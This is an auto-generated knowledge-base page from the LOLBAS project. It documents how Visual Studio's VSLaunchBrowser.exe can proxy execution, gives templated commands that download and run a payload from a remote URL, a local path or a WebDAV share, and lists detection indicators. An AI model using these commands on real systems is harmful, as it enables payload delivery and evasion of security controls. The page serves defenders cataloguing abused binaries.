---
title: "VSLaunchBrowser.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/VsLaunchBrowser.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/VsLaunchBrowser.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "VSLaunchBrowser.exe"
functions:
  - "Download"
  - "Execute"
attack_technique_ids:
  - "T1105"
  - "T1127"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# VSLaunchBrowser.exe

Microsoft Visual Studio browser launcher tool for web applications debugging

## Metadata

- Category: OtherMSBinaries
- Created: 2024-04-12
- Author: Avihay Eldad
- Source Path: yml/OtherMSBinaries/VsLaunchBrowser.yml

## Paths

- `C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe`

## Commands

### 1. Download

Download and execute payload from remote server

```cmd
VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
```

- Use Case: It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

### 2. Execute

Execute payload via VSLaunchBrowser as parent process

```cmd
VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
```

- Use Case: It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127]]

### 3. Execute

Execute payload from WebDAV server via VSLaunchBrowser as parent process

```cmd
VSLaunchBrowser.exe .exe {PATH_SMB}
```

- Use Case: It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1127-trusted_developer_utilities_proxy_execution|T1127]]

## Detections

- IOC: cmd.exe as sub-process of VSLaunchBrowser
- IOC: URL on a VSLaunchBrowser command line
- IOC: VSLaunchBrowser making unexpected network connections or DNS requests

## Acknowledgements

- {'Person': 'Avihay Eldad', 'Handle': '@AvihayEldad'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/VsLaunchBrowser.yml)
